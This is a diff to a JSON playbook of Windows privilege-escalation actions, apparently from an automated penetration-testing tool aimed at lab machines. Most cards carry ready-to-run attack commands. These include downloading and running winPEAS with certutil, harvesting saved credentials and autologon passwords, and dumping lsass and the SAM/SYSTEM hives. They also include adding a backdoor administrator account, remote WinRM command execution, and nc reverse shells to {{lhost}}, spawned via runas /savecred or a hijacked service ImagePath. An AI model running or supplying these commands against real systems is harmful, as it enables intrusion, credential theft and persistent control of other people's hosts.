@@ -6,7 +6,7 @@
   "actions": [
     {
       "id": "windows-enum",
-      "title": "Local Enumeration Sweep",
+      "title": "Local Privilege Escalation Enumeration (Windows)",
       "hypothesis": "Follow the same principle used on Linux: let a scanner (winpeas) give you coverage, and let your own reasoning pick the winner. The usual findings in lab environments are misconfigured services, credentials left lying around, unquoted paths, and abusable token privileges. Kick off the scanner, but confirm the specific candidate by hand before you set up any exploit.",
       "tool": "winpeas",
       "tools": [
@@ -23,10 +23,20 @@
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "access.system",
+        "objective.root_flag"
+      ],
       "produces": [
         "privesc.leads",
         "host.kernel",
         "host.arch"
+      ],
+      "settled_by": [
+        "privesc.leads",
+        "host.local_enum",
+        "host.kernel"
       ],
       "priority": 94,
       "proves": "surfaces candidate local privilege-escalation avenues, the host kernel/version, and the host architecture",
@@ -43,22 +53,32 @@
         {
           "tool": "winpeas",
           "run": "certutil -urlcache -f http://{{lhost}}:8000/winPEASx64.exe wp.exe && wp.exe",
-          "note": "Host it on your own machine. This is the cmd form; switch to iwr when you are inside a PowerShell session."
+          "note": "Host it on your own machine. This is the cmd form; switch to iwr when you are inside a PowerShell session.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "whoami /all && systeminfo && net localgroup administrators",
-          "note": "Your identity, the patch level (useful for kernel-CVE triage), and the list of who is already an administrator."
+          "note": "Your identity, the patch level (useful for kernel-CVE triage), and the list of who is already an administrator.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "cmdkey /list && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
-          "note": "Saved credentials and autologon settings, these hand you passwords more often than you might expect."
+          "note": "Saved credentials and autologon settings, these hand you passwords more often than you might expect.",
+          "locus": "onhost"
         },
         {
           "tool": "powershell",
           "run": "powershell -c \"Get-Content (Get-PSReadLineOption).HistorySavePath\"",
-          "note": "PowerShell console history: Dumps ConsoleHost_history.txt where previous administrative operators and scripts often store cleartext passwords, tokens, and domain accounts."
+          "note": "PowerShell console history: Dumps ConsoleHost_history.txt where previous administrative operators and scripts often store cleartext passwords, tokens, and domain accounts.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x 'whoami /all && systeminfo && net localgroup administrators && cmdkey /list'",
+          "note": "Remote from Kali (WinRM): collect token privileges, OS build/hotfixes, local administrators, and saved credentials in one remote command."
         }
       ]
     },
@@ -75,7 +95,9 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "requires_any": [
         "privesc.windows_privilege"
       ],
@@ -122,7 +144,7 @@
     },
     {
       "id": "potato-select",
-      "title": "Potato Failed — Pick the Right One",
+      "title": "Potato Failed - Pick the Right One",
       "tool": "PrintSpoofer",
       "tools": [
         "PrintSpoofer",
@@ -141,7 +163,7 @@
       "priority": 70,
       "hypothesis": "A SeImpersonate potato that errors (\"the handle is invalid\", a CoGetInstanceFromIStorage failure) is the wrong potato for this build - NOT a dead end, the privilege is still yours. Best practice is to match the build up front (see the SeImpersonate card); this card is the recovery when it failed anyway. Re-pick by version: GodPotato/PrintSpoofer for 2016/2019/2022 and Win10+, JuicyPotato only on older builds. One of them lands SYSTEM.",
       "proves": "nothing new; it points you at the potato that works on this build",
-      "does_not_prove": "that you lack the privilege — SeImpersonate/SeAssignPrimaryToken is what makes any of these work",
+      "does_not_prove": "that you lack the privilege - SeImpersonate/SeAssignPrimaryToken is what makes any of these work",
       "report": {
         "finding": "Token-impersonation technique mismatch",
         "severity": "info"
@@ -180,9 +202,12 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "requires_any": [
-        "privesc.unquoted_service_path"
+        "privesc.unquoted_service_path",
+        "privesc.unquoted_service"
       ],
       "deprioritize_when": [
         "access.admin",
@@ -226,7 +251,9 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "requires_any": [
         "privesc.weak_service_permission"
       ],
@@ -277,7 +304,9 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "requires_any": [
         "privesc.always_install_elevated"
       ],
@@ -319,7 +348,7 @@
     {
       "id": "dpapi-secrets",
       "title": "DPAPI Credential Decryption",
-      "hypothesis": "Saved credentials on Windows (RDP, scheduled tasks, browsers) are encrypted under DPAPI masterkeys, and those masterkeys are in turn protected by the user's password hash. Wherever you already have the user's password (or SYSTEM), the whole credential store can be decrypted, a dependable route to lateral credentials across the 0xdf corpus.",
+      "hypothesis": "Saved credentials on Windows (RDP, scheduled tasks, browsers) are encrypted under DPAPI masterkeys, and those masterkeys are in turn protected by the user's password hash. Wherever you already have the user's password (or SYSTEM), the whole credential store can be decrypted, a dependable route to lateral credentials across Windows workstations and servers.",
       "tool": "impacket-dpapi",
       "tools": [
         "impacket-dpapi",
@@ -333,11 +362,17 @@
       ],
       "requires_any": [
         "credential.available",
-        "access.system"
+        "access.system",
+        "privesc.stored_credentials",
+        "privesc.stored_creds"
       ],
       "produces": [
         "credential.plaintext",
         "credential.candidate",
+        "credential.available"
+      ],
+      "settled_by": [
+        "credential.plaintext",
         "credential.available"
       ],
       "priority": 66,
@@ -409,37 +444,50 @@
         {
           "tool": "sh",
           "run": "cmdkey /list",
-          "note": "Saved credentials. If one is present: runas /savecred /user:{{user}} cmd.exe lets you use it without ever knowing the password."
+          "note": "Saved credentials. If one is present: runas /savecred /user:{{user}} cmd.exe lets you use it without ever knowing the password.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
-          "note": "Autologon: DefaultUserName / DefaultPassword sitting in cleartext."
+          "note": "Autologon: DefaultUserName / DefaultPassword sitting in cleartext.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "dir /s C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml 2>nul",
-          "note": "Imaging answer files, they carry local admin passwords in cleartext. Check C:\\Windows\\Panther\\Unattend.xml as well."
+          "note": "Imaging answer files, they carry local admin passwords in cleartext. Check C:\\Windows\\Panther\\Unattend.xml as well.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "dir /s %APPDATA%\\..\\*mRemoteNG*confCons.xml 2>nul && dir %USERPROFILE%\\*.rdp",
-          "note": "mRemoteNG configs store passwords that are encrypted but recoverable via a static key; .rdp files reveal targets and usernames."
+          "note": "mRemoteNG configs store passwords that are encrypted but recoverable via a static key; .rdp files reveal targets and usernames.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "dir %APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login* 2>nul",
-          "note": "Browser vaults are DPAPI-protected, recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline."
+          "note": "Browser vaults are DPAPI-protected, recover them with SharpChrome, or copy Login Data plus the Local State key and crack them offline.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s",
-          "note": "PuTTY saved sessions store secrets in cleartext: a ProxyPassword/ProxyUsername pair, or a full plink command line with -pw '<pass>' <user>@<host>. obol extracts the credential straight from this output."
+          "note": "PuTTY saved sessions store secrets in cleartext: a ProxyPassword/ProxyUsername pair, or a full plink command line with -pw '<pass>' <user>@<host>. obol extracts the credential straight from this output.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" /s 2>nul",
-          "note": "WinSCP stores session passwords obfuscated (not cleartext), flag them, then recover with a WinSCP password decoder / winscppasswd."
+          "note": "WinSCP stores session passwords obfuscated (not cleartext), flag them, then recover with a WinSCP password decoder / winscppasswd.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x 'cmdkey /list & reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" & dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul'",
+          "note": "Remote from Kali (WinRM): check Credential Manager, Winlogon autologon keys, and unattend/sysprep answer files remotely."
         }
       ]
     },
@@ -455,9 +503,13 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "requires_any": [
-        "foothold.windows",
+        "privesc.leads",
+        "privesc.backup_hives",
+        "loot.files",
         "access.shell",
         "access.system"
       ],
@@ -508,7 +560,7 @@
     {
       "id": "wesng-patch-gaps",
       "title": "Missing-Patch Exploit Suggestions (wesng)",
-      "hypothesis": "Aging Windows hosts (particularly HTB-era 2008/2012/7) are frequently escalated through a missing patch rather than a misconfiguration. Feeding systeminfo output to Windows Exploit Suggester / wesng maps absent hotfixes to public exploits (MS16-032, MS15-051, Chimichurri, and so on). This is the arctic/grandpa workflow: enumerate the patches, match them, then exploit.",
+      "hypothesis": "Aging Windows hosts (particularly Windows Server 2008/2012 and Windows 7/10) are frequently escalated through a missing patch rather than a misconfiguration. Feeding systeminfo output to Windows Exploit Suggester / wesng maps absent hotfixes to public exploits (MS16-032, MS15-051, Chimichurri, and so on). The standard kernel workflow: enumerate the patches, match them, then stage the exploit.",
       "tool": "wesng",
       "tools": [
         "wesng"
@@ -527,6 +579,11 @@
       "produces": [
         "exploit.candidate",
         "privesc.patch_gap"
+      ],
+      "settled_by": [
+        "privesc.patch_gap",
+        "exploit.candidate",
+        "privesc.leads"
       ],
       "priority": 70,
       "proves": "surfaces a candidate exploit and a missing-patch privilege-escalation lead",
@@ -552,7 +609,7 @@
         {
           "tool": "sh",
           "run": "python3 windows-exploit-suggester.py --update && python3 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt",
-          "note": "The classic alternative (corpus arctic). Older, but well proven on 2008-era hosts."
+          "note": "The classic Python alternative to wesng. Older, but well proven on 2008-era hosts."
         }
       ]
     },
@@ -588,7 +645,7 @@
       "commands": [
         {
           "tool": "sh",
-          "run": "net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add",
+          "run": "net user obol_supp \"Str0ng!Passw0rd\" /add && net localgroup administrators obol_supp /add",
           "note": "The textbook local-admin backdoor. Stands out in any user audit, acceptable in labs, noisy in real environments."
         },
         {
@@ -628,6 +685,11 @@
         "hash.ntlm",
         "kerberos.tickets"
       ],
+      "settled_by": [
+        "hash.ntlm",
+        "credential.plaintext",
+        "kerberos.tickets"
+      ],
       "priority": 66,
       "proves": "recovers a plaintext password, NTLM hashes, and Kerberos tickets",
       "does_not_prove": "produces credential material only, it is not access until it successfully authenticates against a service",
@@ -647,8 +709,8 @@
         },
         {
           "tool": "cmd",
-          "run": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
-          "note": "A built-in LOLBin dump, swap 672 for the real PID and run it from an elevated prompt. Nothing gets uploaded; comsvcs.dll MiniDump is a documented Windows capability. (Defender flags this exact string on current builds; fall back to procdump then.)"
+          "run": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump {{lsass_pid|672}} C:\\Windows\\Temp\\lsass.dmp full",
+          "note": "A built-in LOLBin dump, swap {{lsass_pid|672}} for the real PID and run it from an elevated prompt. Nothing gets uploaded; comsvcs.dll MiniDump is a documented Windows capability. (Defender flags this exact string on current builds; fall back to procdump then.)"
         },
         {
           "tool": "sh",
@@ -705,22 +767,32 @@
         {
           "tool": "powershell",
           "run": "$ExecutionContext.SessionState.LanguageMode",
-          "note": "FullLanguage vs ConstrainedLanguage. Constrained language mode is a lockdown signal worth recording before you try anything on the box."
+          "note": "FullLanguage vs ConstrainedLanguage. Constrained language mode is a lockdown signal worth recording before you try anything on the box.",
+          "locus": "onhost"
         },
         {
           "tool": "powershell",
           "run": "Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled",
-          "note": "Whether Microsoft Defender and its real-time protection are running on this host."
+          "note": "Whether Microsoft Defender and its real-time protection are running on this host.",
+          "locus": "onhost"
         },
         {
           "tool": "powershell",
           "run": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
-          "note": "Any folders Defender is configured to skip. Situational awareness only, recorded, not acted on."
+          "note": "Any folders Defender is configured to skip. Situational awareness only, recorded, not acted on.",
+          "locus": "onhost"
         },
         {
           "tool": "powershell",
           "run": "Get-AppLockerPolicy -Effective -Xml",
-          "note": "The effective AppLocker policy, if one is applied, which rule collections are enforced."
+          "note": "The effective AppLocker policy, if one is applied, which rule collections are enforced.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -X '$ExecutionContext.SessionState.LanguageMode; Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled; Get-MpPreference | Select-Object -ExpandProperty ExclusionPath'",
+          "note": "Remote from Kali (WinRM): check PowerShell language mode, Defender real-time status, and exclusion paths remotely before dropping files on the host."
         }
       ]
     },
@@ -769,9 +841,9 @@
           "note": "Confirm a third-party service runs as LocalSystem."
         },
         {
-          "tool": "procmon",
-          "run": "Procmon filter: Process is the service, Result is NAME NOT FOUND, Path ends with .dll",
-          "note": "Find a DLL it loads from a writable directory or cannot find at all."
+          "tool": "powershell",
+          "run": "powershell -c \"Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName | Where-Object { $_.PathName -notmatch 'C:\\\\Windows' }\"",
+          "note": "Enumerate non-default services whose directory may be writable or susceptible to phantom DLL search-order hijacking."
         },
         {
           "tool": "msfvenom",
@@ -931,7 +1003,9 @@
       ],
       "speculative": true,
       "requires_any": [
-        "foothold.windows"
+        "privesc.uac_bypass",
+        "privesc.windows_privilege",
+        "privesc.leads"
       ],
       "produces": [
         "access.admin"
@@ -970,7 +1044,9 @@
           "note": "High Mandatory Level confirms full admin; clean up the registry key afterward."
         }
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "deprioritize_when": [
         "access.admin",
         "access.system"
@@ -993,7 +1069,9 @@
       ],
       "speculative": true,
       "requires_any": [
-        "foothold.windows"
+        "privesc.com_hijack",
+        "privesc.scheduled_task",
+        "privesc.leads"
       ],
       "produces": [
         "access.system"
@@ -1012,9 +1090,9 @@
       ],
       "commands": [
         {
-          "tool": "procmon",
-          "run": "Procmon filter: Operation is RegOpenKey, Result is NAME NOT FOUND, Path contains CLSID",
-          "note": "A privileged process resolving a CLSID from HKCU that does not exist is a hijack slot you can fill."
+          "tool": "reg",
+          "run": "reg query \"HKCU\\Software\\Classes\\CLSID\" /s 2>nul",
+          "note": "Inspect user-hive CLSID overrides; a privileged process resolving a CLSID from HKCU is a hijack slot you can fill."
         },
         {
           "tool": "msfvenom",
@@ -1032,7 +1110,9 @@
           "note": "The next privileged instantiation runs your DLL; membership confirms it, and the key is a persistence foothold."
         }
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "deprioritize_when": [
         "access.system",
         "access.admin"
@@ -1100,7 +1180,8 @@
       ],
       "deprioritize_when": [
         "access.system",
-        "access.admin"
+        "access.admin",
+        "privesc.unquoted_service_path"
       ]
     },
     {
@@ -1117,7 +1198,9 @@
       ],
       "speculative": true,
       "requires_any": [
-        "foothold.windows"
+        "privesc.windows_privilege",
+        "privesc.weak_service_permission",
+        "privesc.leads"
       ],
       "produces": [
         "access.system"
@@ -1156,7 +1239,9 @@
           "note": "After ImpersonateNamedPipeClient and DuplicateTokenEx you run as the client; a SYSTEM result confirms it, then capture proof."
         }
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "deprioritize_when": [
         "access.system",
         "access.admin"
@@ -1275,9 +1360,13 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
-      "requires_any": [
+      "requires_all": [
         "foothold.windows"
+      ],
+      "requires_any": [
+        "privesc.wsl",
+        "privesc.leads",
+        "loot.files"
       ],
       "produces": [
         "credential.candidate",
@@ -1322,9 +1411,13 @@
       "os": [
         "windows"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.windows"
+      ],
       "requires_any": [
-        "foothold.windows",
+        "vuln.prtg",
+        "privesc.leads",
+        "loot.files",
         "smb.readable_share"
       ],
       "produces": [
@@ -1422,9 +1515,12 @@
         "windows"
       ],
       "speculative": true,
-      "requires_all": [],
-      "requires_any": [
+      "requires_all": [
         "foothold.windows"
+      ],
+      "requires_any": [
+        "privesc.leads",
+        "loot.files"
       ],
       "produces": [
         "access.admin"
@@ -1469,6 +1565,7 @@
       "os": [
         "windows"
       ],
+      "locus": "R",
       "requires_all": [],
       "requires_any": [
         "port:29819",
@@ -1505,6 +1602,141 @@
         "foothold.windows",
         "access.admin",
         "access.system"
+      ]
+    },
+    {
+      "id": "runas-savedcred-exec",
+      "transition": "privesc_act",
+      "title": "Abuse Windows Credential Manager Saved Credentials (runas /savecred)",
+      "phase": "escalate",
+      "hypothesis": "When cmdkey /list reveals cached Windows Credential Manager entries for Administrator or a privileged service account, runas /savecred executes arbitrary commands or reverse shells under that cached identity without prompting for a password.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "runas"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "foothold.windows"
+      ],
+      "requires_any": [
+        "privesc.stored_credentials",
+        "privesc.stored_creds"
+      ],
+      "produces": [
+        "access.admin",
+        "access.system"
+      ],
+      "settled_by": [
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "access.system",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 88,
+      "proves": "executes commands as Administrator using cached Windows Credential Manager credentials via runas /savecred",
+      "does_not_prove": "elevation if the cached credential entry in cmdkey /list is for a non-interactive network share rather than an interactive logon session",
+      "report": {
+        "finding": "Privilege Escalation via Cached Windows Credential Manager Entry (runas /savecred)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "cmd",
+          "run": "runas /savecred /user:Administrator \"cmd.exe /c net localgroup administrators {{user}} /add\"",
+          "note": "PREFERRED: Use cached Administrator credentials via runas /savecred to add your current user to the local Administrators group."
+        },
+        {
+          "tool": "cmd",
+          "run": "runas /savecred /user:Administrator \"C:\\Windows\\Temp\\nc.exe {{lhost}} {{lport}} -e cmd.exe\"",
+          "note": "Spawn an interactive Administrator reverse shell directly using the saved Credential Manager token."
+        }
+      ]
+    },
+    {
+      "id": "sebackup-serestore-abuse",
+      "transition": "privesc_act",
+      "title": "Abuse SeBackupPrivilege / SeRestorePrivilege for Hive Dump or Service Takeover",
+      "phase": "escalate",
+      "hypothesis": "Accounts in Backup Operators or holding SeBackupPrivilege / SeRestorePrivilege / SeManageVolumePrivilege bypass NTFS ACLs: SeBackupPrivilege allows saving HKLM\\SAM and HKLM\\SYSTEM hives or copying root.txt via robocopy /b, while SeRestorePrivilege allows overwriting service ImagePath registry keys or system DLLs for SYSTEM execution.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "reg",
+        "robocopy",
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "foothold.windows"
+      ],
+      "requires_any": [
+        "privesc.sebackup",
+        "privesc.serestore",
+        "privesc.semanagevolume",
+        "privesc.windows_privilege"
+      ],
+      "produces": [
+        "access.admin",
+        "access.system",
+        "loot.sam",
+        "hash.ntlm"
+      ],
+      "settled_by": [
+        "access.admin",
+        "access.system",
+        "loot.sam",
+        "hash.ntlm"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "access.system",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 89,
+      "proves": "dumps SAM/SYSTEM registry hives or overwrites service ImagePath to obtain NT AUTHORITY\\SYSTEM access via SeBackupPrivilege / SeRestorePrivilege",
+      "does_not_prove": "privilege escalation if the privilege is present only in a filtered medium-integrity token that has not yet bypassed UAC or been enabled",
+      "report": {
+        "finding": "Privilege Escalation via SeBackupPrivilege / SeRestorePrivilege Abuse",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
+      ],
+      "commands": [
+        {
+          "tool": "reg",
+          "run": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save",
+          "note": "PREFERRED (SeBackupPrivilege): Save SAM and SYSTEM registry hives directly using backup semantics for offline secretsdump extraction."
+        },
+        {
+          "tool": "cmd",
+          "run": "robocopy /b C:\\Users\\Administrator\\Desktop C:\\Windows\\Temp root.txt proof.txt",
+          "note": "Copy protected Administrator files using robocopy /b (backup mode) when SeBackupPrivilege is enabled."
+        },
+        {
+          "tool": "powershell",
+          "run": "powershell -ep bypass -c \"reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc' /v ImagePath /t REG_EXPAND_SZ /d 'C:\\Windows\\Temp\\nc.exe {{lhost}} {{lport}} -e cmd.exe' /f; sc.exe start UsoSvc\"",
+          "note": "SeRestorePrivilege service takeover: Overwrite a SYSTEM service ImagePath and start the service for a SYSTEM shell."
+        }
       ]
     }
   ]
